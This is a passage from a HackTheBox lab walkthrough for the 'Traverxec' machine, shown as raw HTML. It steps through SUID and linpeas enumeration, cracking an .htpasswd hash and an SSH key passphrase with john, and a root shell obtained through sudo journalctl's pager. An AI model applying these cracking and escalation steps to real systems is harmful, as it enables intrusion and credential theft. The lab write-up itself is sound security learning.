plain"># World writable and executable folders</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">find / \( -perm -o w -perm -o x \) -type d 2&gt;/dev/null</span><br></span></code></pre></div></div>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#d6deeb;--prism-background-color:#011627"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#d6deeb;background-color:#011627"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#d6deeb"><span class="token plain">$ find / -perm /4000</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">/usr/lib/openssh/ssh-keysign</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">/usr/lib/eject/dmcrypt-get-device</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">/usr/bin/sudo</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">/usr/bin/umount</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">/usr/bin/su</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">/usr/bin/gpasswd</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">/usr/bin/newgrp</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">/usr/bin/mount</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">/usr/bin/chsh</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">/usr/bin/passwd</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">/usr/bin/chfn</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="linpeas">linpeas<a href="#linpeas" class="hash-link" aria-label="Direct link to linpeas" title="Direct link to linpeas">‚Äã</a></h3>
<p>From my attack host I do a <code>sudo python3 http.server 80</code> where my tools are, and then <code>wget</code> it from my reverse shell.</p>
<p>I run <code>linpeas.sh</code></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#d6deeb;--prism-background-color:#011627"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#d6deeb;background-color:#011627"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#d6deeb"><span class="token plain">‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£ SUID - Check easy privesc, exploits and write perms</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">‚ïö https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">strings Not Found</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">strace Not Found</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">-rwsr-xr-x 1 root root 427K Oct  6  2019 /usr/lib/openssh/ssh-keysign</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">-r-sr-xr-x 1 root root 14K Nov 12  2019 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">-r-sr-xr-x 1 root root 14K Nov 12  2019 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">-rwsr-xr-- 1 root messagebus 50K Jun  9  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">-rwsr-xr-x 1 root root 10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">-rwsr-xr-x 1 root root 154K Oct 12  2019 /usr/bin/sudo  ---&gt;  check_if_the_sudo_version_is_vulnerable</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">-rwsr-xr-x 1 root root 35K Jan 10  2019 /usr/bin/umount  ---&gt;  BSD/Linux(08-1996)</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">-rwsr-xr-x 1 root root 63K Jan 10  2019 /usr/bin/su</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">-rwsr-xr-x 1 root root 83K Jul 27  2018 /usr/bin/gpasswd</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">-rwsr-xr-x 1 root root 44K Jul 27  2018 /usr/bin/newgrp  ---&gt;  HP-UX_10.20</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">-rwsr-xr-x 1 root root 51K Jan 10  2019 /usr/bin/mount  ---&gt;  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">699.24.8</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">-rwsr-xr-x 1 root root 44K Jul 27  2018 /usr/bin/chsh</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">-rwsr-xr-x 1 root root 63K Jul 27  2018 /usr/bin/passwd  ---&gt;  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">9/Sun_Solaris_2.3_to_2.5.1(02-1997)</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">-rwsr-xr-x 1 root root 53K Jul 27  2018 /usr/bin/chfn  ---&gt;  SuSE_9.3/10</span><br></span></code></pre></div></div>
<p>this looks interesting:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#d6deeb;--prism-background-color:#011627"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#d6deeb;background-color:#011627"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#d6deeb"><span class="token plain">‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£ Analyzing Htpasswd Files (limit 70)</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">-rw-r--r-- 1 root bin 41 Oct 25  2019 /var/nostromo/conf/.htpasswd</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="cracking">CRACKING<a href="#cracking" class="hash-link" aria-label="Direct link to CRACKING" title="Direct link to CRACKING">‚Äã</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="htpasswd">.htpasswd<a href="#htpasswd" class="hash-link" aria-label="Direct link to .htpasswd" title="Direct link to .htpasswd">‚Äã</a></h3>
<p>Using <code>john</code> the ripper, the <code>rockyou.txt</code> wordlist and the hash copied to my attack host:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#d6deeb;--prism-background-color:#011627"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#d6deeb;background-color:#011627"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#d6deeb"><span class="token plain">RxHackk Á¶è ~/Repos/RxHack/HTB/BOXES/TRAVERXEC/crack ‚û§ 431f6ec|main‚ö°</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">601 üíÄ ¬± ‚û§ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Warning: detected hash type &quot;md5crypt&quot;, but the string is also recognized as &quot;md5crypt-long&quot;</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Use the &quot;--format=md5crypt-long&quot; option to force loading these as that type instead</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Using default input encoding: UTF-8</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Will run 2 OpenMP threads</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0g 0:00:00:39 12.80% (ETA: 20:31:49) 0g/s 50608p/s 50608c/s 50608C/s auytun..autsang123</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0g 0:00:00:42 13.74% (ETA: 20:31:50) 0g/s 50443p/s 50443c/s 50443C/s AVISALARI..AUGUST6</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0g 0:00:03:05 65.97% (ETA: 20:31:25) 0g/s 50083p/s 50083c/s 50083C/s breech89..breeanna91</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Nowonly4me       (david)</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">1g 0:00:03:31 DONE (2022-04-05 20:30) 0.004736g/s 50107p/s 50107c/s 50107C/s Noyoudo..November^</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Session completed</span><br></span></code></pre></div></div>
<p>I try <code>su - david</code> and <code>ssh david@10.10.10.165</code>, but this password doesn&#x27;t work for those.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="more-linux-enum">MORE LINUX ENUM<a href="#more-linux-enum" class="hash-link" aria-label="Direct link to MORE LINUX ENUM" title="Direct link to MORE LINUX ENUM">‚Äã</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="review-linpeassh-output">review linpeas.sh output<a href="#review-linpeassh-output" class="hash-link" aria-label="Direct link to review linpeas.sh output" title="Direct link to review linpeas.sh output">‚Äã</a></h3>
<p>Run linpeas again and see what else I can find:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#d6deeb;--prism-background-color:#011627"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#d6deeb;background-color:#011627"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#d6deeb"><span class="token plain">‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£ Executing Linux Exploit Suggester</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">‚ïö https://github.com/mzet-/linux-exploit-suggester</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">cat: write error: Broken pipe</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">cat: write error: Broken pipe</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">[+] [CVE-2019-13272] PTRACE_TRACEME</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1903</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">   Exposure: highly probable</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">   Tags: ubuntu=16.04{kernel:4.15.0-*},ubuntu=18.04{kernel:4.15.0-*},debian=9{kernel:4.9.0-*},[ debian=10{kernel:4.19.0-*} ],fedora=30{kernel:5.0.9-*}</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">   Download URL: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/47133.zip</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2019-13272/poc.c</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">   Comments: Requires an active PolKit agent.</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="nostromo-config-files">nostromo config files<a href="#nostromo-config-files" class="hash-link" aria-label="Direct link to nostromo config files" title="Direct link to nostromo config files">‚Äã</a></h3>
<p>So, after few hints from Tedd in chat, I review <code>/var/nostromo/conf/</code> folder, and in the config file it has this:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#d6deeb;--prism-background-color:#011627"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#d6deeb;background-color:#011627"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#d6deeb"><span class="token plain"># HOMEDIRS [OPTIONAL]</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">homedirs                /home</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">homedirs_public         public_www</span><br></span></code></pre></div></div>
<p>According to nostromo, this means <code>/home/*/public_www</code> is accessible to the <code>www-data</code> user.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="public-folders">public folders<a href="#public-folders" class="hash-link" aria-label="Direct link to public folders" title="Direct link to public folders">‚Äã</a></h3>
<p>go here <code>/home/david/public_www</code></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#d6deeb;--prism-background-color:#011627"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#d6deeb;background-color:#011627"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#d6deeb"><span class="token plain">cd /home/david/public_www</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">ls</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">ls</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">index.html  protected-file-area</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">ls -al</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">ls -al</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">total 16</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">drwxr-xr-x 3 david david 4096 Oct 25  2019 .</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">drwx--x--x 5 david david 4096 Oct 25  2019 ..</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">-rw-r--r-- 1 david david  402 Oct 25  2019 index.html</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">drwxr-xr-x 2 david david 4096 Oct 25  2019 protected-file-area</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">cd protected-file-area</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">cd protected-file-area</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">ls</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">ls</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">backup-ssh-identity-files.tgz</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">www-data@traverxec:/home/david/public_www/protected-file-area$</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="privesc-user">PRIVESC USER<a href="#privesc-user" class="hash-link" aria-label="Direct link to PRIVESC USER" title="Direct link to PRIVESC USER">‚Äã</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="ssh-keys">ssh keys<a href="#ssh-keys" class="hash-link" aria-label="Direct link to ssh keys" title="Direct link to ssh keys">‚Äã</a></h3>
<p>From <code>/home/david/public_www</code> folder we found a backup of the users ssh keys.</p>
<p>Copy *.tgz to /tmp and then untar</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#d6deeb;--prism-background-color:#011627"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#d6deeb;background-color:#011627"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#d6deeb"><span class="token plain">tar xvf backup-ssh-identity-files.tgz</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">tar xvf backup-ssh-identity-files.tgz</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">home/david/.ssh/</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">home/david/.ssh/authorized_keys</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">home/david/.ssh/id_rsa</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">home/david/.ssh/id_rsa.pub</span><br></span></code></pre></div></div>
<p>copied <code>id_rsa</code> to local machine, then <code>ssh -i ./id_rsa david@10.10.10.165</code></p>
<p>using the <code>.htpasswd</code> cracked hash doesn&#x27;t work, so we try to crack the private key itself <code>id_rsa</code></p>
<p>use <code>ssh2john</code> to convert the <code>id_rsa</code> file to john crackable format: <code>python2 /usr/share/john/ssh2john.py ../keys/id_pub &gt; id_pub.hash</code></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#d6deeb;--prism-background-color:#011627"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#d6deeb;background-color:#011627"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#d6deeb"><span class="token plain">RxHackk Á¶è ~/Repos/RxHack/HTB/BOXES/TRAVERXEC/crack ‚û§ 431f6ec|main‚ö°</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">697 üíÄ ¬± ‚û§ john --wordlist=/usr/share/wordlists/rockyou.txt id_pub.hash</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Using default input encoding: UTF-8</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Cost 2 (iteration count) is 1 for all loaded hashes</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Will run 2 OpenMP threads</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Note: This format may emit false positives, so it will keep trying even after</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">finding a possible candidate.</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">hunter           (../keys/id_pub)</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">1g 0:00:00:36 DONE (2022-04-05 21:33) 0.02737g/s 392600p/s 392600c/s 392600C/sa6_123..*7¬°Vamos!</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Session completed</span><br></span></code></pre></div></div>
<p>re-try ssh, with the cracked <code>.htpasswd</code> passphrase:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#d6deeb;--prism-background-color:#011627"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#d6deeb;background-color:#011627"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#d6deeb"><span class="token plain">708 üíÄ ¬± ‚û§ ssh -i ./id_rsa david@10.10.10.165</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Enter passphrase for key &#x27;./id_rsa&#x27;:</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">david@traverxec:~$</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="privesc-root">PRIVESC ROOT<a href="#privesc-root" class="hash-link" aria-label="Direct link to PRIVESC ROOT" title="Direct link to PRIVESC ROOT">‚Äã</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="journalctl-less">journalctl less<a href="#journalctl-less" class="hash-link" aria-label="Direct link to journalctl less" title="Direct link to journalctl less">‚Äã</a></h3>
<p>There a script in davids <code>~/bin</code> directory with this command: <code>/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service</code></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#d6deeb;--prism-background-color:#011627"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#d6deeb;background-color:#011627"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#d6deeb"><span class="token plain">david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">-- Logs begin at Tue 2022-04-05 04:25:57 EDT, end at Tue 2022-04-05 06:22:22 EDT. --</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Apr 05 04:56:24 traverxec sudo[5475]: pam_unix(sudo:auth): auth could not identify password for [www-data]</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Apr 05 04:56:24 traverxec sudo[5475]: www-data : command not allowed ; TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=list</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Apr 05 04:56:25 traverxec nologin[5516]: Attempted login by UNKNOWN on UNKNOWN</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Apr 05 05:07:22 traverxec su[12115]: pam_unix(su-l:auth): authentication failure; logname= uid=33 euid=0 tty=pts/1 ruser=www-data r</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Apr 05 05:07:24 traverxec su[12115]: FAILED SU (to root) www-data on pts/1</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">!/bin/sh</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"># id</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">uid=0(root) gid=0(root) groups=0(root)</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"># whoami</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">root</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">#</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"># cd /root</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"># ls</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">nostromo_1.9.6-1.deb  root.txt</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"># cat root.txt</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">9aa36a6d76f785dfd320a478f6e0d906</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">#</span><br></span></code></pre></div></div></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="row margin-top--sm theme-doc-footer-tags-row"><div class="col"><b>Tags:</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a rel="tag" class="tag_zVej tagRegular_sFm0" href="/docs/tags/hackthebox">hackthebox</a></li><li class="tag_QGVx"><a rel="tag" class="tag_zVej tagRegular_sFm0" href="/docs/tags/linux">linux</a></li><li class="tag_QGVx"><a rel="tag" class="tag_zVej tagRegular_sFm0" href="/docs/tags/web-exploitation">web-exploitation</a></li><li class="tag_QGVx"><a rel="tag" class="tag_zVej tagRegular_sFm0" href="/docs/tags/privilege-escalation">privilege-escalation</a></li><li class="tag_QGVx"><a rel="tag" class="tag_zVej tagRegular_sFm0" href="/docs/tags/walkthrough">walkthrough</a></li></ul></div></div><div class="row margin-top--sm theme-doc-footer-edit-meta-row"><div class="col"><a href="https://github.com/ronamosa/ronamosa.github.io/edit/main/website/docs/hacker/hackthebox/traverxec.md" target="_blank" rel="noopener noreferrer" class="theme-edit-this-page"><svg fill="currentColor" height="20" width="20" viewBox="0 0 40 40" class="iconEdit_Z9Sw" aria-hidden="true"><g><path d="m34.5 11.7l-3 3.1-6.3-6.3 3.1-3q0.5-0.5 1.2-0.5t1.1 0.5l3.9 3.9q0.5 0.4 0.5 1.1t-0.5 1.2z m-29.5 17.1l18.4-18.5 6.3 6.3-18.4 18.4h-6.3v-6.2z"></path></g></svg>Edit this page</a></div><div class="col lastUpdated_JAkA"><span class="theme-last-updated">Last updated<!-- --> on <b><time datetime="2025-09-22T07:31:42.000Z" itemprop="dateModified">Sep 22, 2025</time></b> by <b>Ron Amosa</b></span></div></div></footer></article><nav class="docusaurus-mt-lg pagination-nav" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/docs/hacker/tryhackme/hololive"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">Holo Live</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/docs/hacker/hackthebox/legacy"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">HackTheBox Legacy Walkthrough - Windows SMB Exploitation and MS08-067</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#brief" class="table-of-contents__link toc-highlight">Brief</a></li><li><a href="#key-learnings" class="table-of-contents__link toc-highlight">KEY LEARNINGS</a></li><li><a href="#recon" class="table-of-contents__link toc-highlight">RECON</a><ul><li><a href="#nmap" class="table-of-contents__link toc-highlight">NMAP</a></li></ul></li><li><a href="#exploit" class="table-of-contents__link toc-highlight">EXPLOIT</a></li><li><a href="#foothold" class="table-of-contents__link toc-highlight">FOOTHOLD</a><ul><li><a href="#reverse-shell-netcat" class="table-of-contents__link toc-highlight">reverse shell (netcat)</a></li></ul></li><li><a href="#linux-enumeration" class="table-of-contents__link toc-highlight">LINUX ENUMERATION</a><ul><li><a href="#linpeas" class="table-of-contents__link toc-highlight">linpeas</a></li></ul></li><li><a href="#cracking" class="table-of-contents__link toc-highlight">CRACKING</a><ul><li><a href="#htpasswd" class="table-of-contents__link toc-highlight">.htpasswd</a></li></ul></li><li><a href="#more-linux-enum" class="table-of-contents__link toc-highlight">MORE LINUX ENUM</a><ul><li><a href="#review-linpeassh-output" class="table-of-contents__link toc-highlight">review linpeas.sh output</a></li><li><a href="#nostromo-config-files" class="table-of-contents__link toc-highlight">nostromo config files</a></li><li><a href="#public-folders" class="table-of-contents__link toc-highlight">public folders</a></li></ul></li><li><a href="#privesc-user" class="table-of-contents__link toc-highlight">PRIVESC USER</a><ul><li><a href="#ssh-keys" class="table-of-contents__link toc-highlight">ssh keys</a></li></ul></li><li><a href="#privesc-root" class="table-of-contents__link toc-highlight">PRIVESC ROOT</a><ul><li><a href="#journalctl-less" class="table-of-contents__link toc-highlight">journalctl less</a></li></ul></li></ul></div></div></div></div></main></div></div></div><footer class="theme-layout-footer footer"><div class="container container-fluid"><div class="row footer__links"><div class="theme-layout-footer-column col footer__col"><div class="footer__title">Connect</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://www.linkedin.com/in/ron-amosa/" target="_blank" rel="noopener noreferrer" class="footer__link-item">LinkedIn<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li class="footer__item"><a href="https://github.com/ronamosa/" target="_blank" rel="noopener noreferrer" class="footer__link-item">GitHub<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li class="footer__item"><a href="https://www.youtube.com/@uncommonengineer" target="_blank" rel="noopener noreferrer" class="footer__link-item">YouTube<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li></ul></div><div class="theme-layout-footer-column col footer__col"><div class="footer__title">Discover</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" href="/blog">Blog</a></li><li class="footer__item"><a class="footer__link-item" href="/docs">Docs</a></li><li class="footer__item"><a class="footer__link-item" href="/about">About</a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Last updated on Mon Sep 22 2025</div></div></div></footer></div>
</body>
</html>